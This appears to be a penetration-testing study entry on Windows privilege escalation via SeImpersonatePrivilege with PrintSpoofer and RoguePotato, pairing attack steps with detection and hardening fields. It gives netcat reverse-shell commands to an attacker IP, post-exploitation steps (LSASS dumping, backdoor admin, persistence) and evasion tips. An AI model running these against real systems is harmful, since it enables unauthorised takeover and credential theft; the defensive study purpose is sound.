notes:
=== SeImpersonate — PrintSpoofer / RoguePotato ===
Modern replacement for JuicyPotato on Server 2019 and Windows 10 1809+.

=== WHEN TO USE ===
JuicyPotato DCOM technique was patched in Server 2019 and Win10 1809+
PrintSpoofer: abuses Windows Print Spooler named pipe coercion
RoguePotato: abuses OXID resolver coercion (requires port 135 redirect or outbound port 135)

=== PRINTSPOOFER FLOW ===
1. Confirm SeImpersonatePrivilege: whoami /priv
2. Transfer PrintSpoofer.exe to target
3. Set up listener: nc -lvnp 4444
4. Execute:
   .\PrintSpoofer.exe -c "nc.exe <ATTACKER_IP> 4444 -e cmd.exe"
   .\PrintSpoofer.exe -i -c cmd   (interactive, if console available)

Mechanism:
1. Creates named pipe \\.\pipe\<random>\pipe\spoolss
2. Coerces Print Spooler (SYSTEM) to authenticate to the named pipe
3. Impersonates the incoming SYSTEM token
4. Spawns specified command with SYSTEM token

=== ROGUEPOTATO ALTERNATIVE ===
.\RoguePotato.exe -r <ATTACKER_IP> -e "nc.exe <IP> 4444 -e cmd.exe" -l 9999
Requires Socat on attacker: socat tcp-listen:135,reuseaddr,fork tcp:<TARGET>:9999

=== DECISION TREE ===
SeImpersonatePrivilege present?
  → OS < Server 2019 / Win10 1809? → JuicyPotato
  → OS >= Server 2019 / Win10 1809? → PrintSpoofer or RoguePotato
  → Print Spooler disabled? → RoguePotato (no Spooler dependency)

=== CHAINING CONTEXT ===
xp_cmdshell MSSQL → PrintSpoofer → SYSTEM
Web shell on IIS → PrintSpoofer → SYSTEM → secretsdump
Service account reverse shell → PrintSpoofer → SYSTEM → mimikatz / secretsdump
After SYSTEM: dump LSASS, run secretsdump, add backdoor admin, deploy persistence OSCP Ch16 uses SigmaPotato (newer variant). SigmaPotato abuses named pipe coercion: coerces NT AUTHORITY\SYSTEM to authenticate to a controlled named pipe, then impersonates via SeImpersonatePrivilege. Works on Server 2019/Win10 where JuicyPotato DCOM was patched. Also consider GodPotato, SweetPotato. Also covered in: OSCP PEN-200 Chapter 16 (Windows Privilege Escalation).

recommended.note: Older-OS alternative via the DCOM/BITS trick.

name: SeImpersonate - PrintSpoofer to SYSTEM
description: PrintSpoofer abuses the print spooler named pipe to impersonate SYSTEM when you hold SeImpersonatePrivilege. Works on Windows 10 / Server 2016-2019 where JuicyPotato fails.

defense.why_it_works: PrintSpoofer exploits SeImpersonatePrivilege by creating a named pipe that impersonates the Print Spooler (SYSTEM). It uses the ImpersonateNamedPipeClient API — with SeImpersonatePrivilege, the service account can impersonate any client that connects, including the SYSTEM-level Spooler service. Works on Windows 10 and Server 2019 where JuicyPotato is blocked.
defense.prerequisites: SeImpersonatePrivilege in current token. PrintSpoofer.exe binary. Print Spooler service running on the target. Works on Windows 10, Server 2016, Server 2019.
defense.impact: SYSTEM-level code execution from a service account (IIS, MSSQL) on modern Windows, bypassing JuicyPotato mitigations in Server 2019+.
defense.detection: PrintSpoofer.exe execution. Named pipe creation by service account with PrintSpoofer pattern. Sysmon Event 1: SYSTEM process spawned from IIS/MSSQL parent. EDR: token impersonation via named pipe.
defense.artifacts: Process: PrintSpoofer.exe by service account | Named pipe: malicious pipe for Spooler connection | Sysmon Event 17/18: pipe created/connected | SYSTEM shell with IIS/MSSQL parent
defense.prevention: Disable Print Spooler on servers that don't need printing (prevents the Spooler from connecting to the pipe). Use GMSA for service accounts. Token filtering policies. Apply PrintNightmare patches (July 2021) which also reduce Print Spooler attack surface.
defense.misconfiguration: IIS or MSSQL running as accounts with SeImpersonatePrivilege. Print Spooler running on application servers. No monitoring on service account token impersonation.
defense.vulnerable_config:
# IIS/MSSQL service account has SeImpersonate:
whoami /priv | findstr SeImpersonate

# PrintSpoofer execution:
.\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
# Returns SYSTEM reverse shell
defense.secure_config:
# Disable Print Spooler on servers:
Stop-Service Spooler
Set-Service Spooler -StartupType Disabled

# Use GMSA for service accounts (no interactive logon, no SeImpersonatePrivilege excess)
# Monitor: service account token impersonation events (Sysmon Event 17/18)

# Apply July 2021 Print Spooler patches
defense.evasion: Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel.
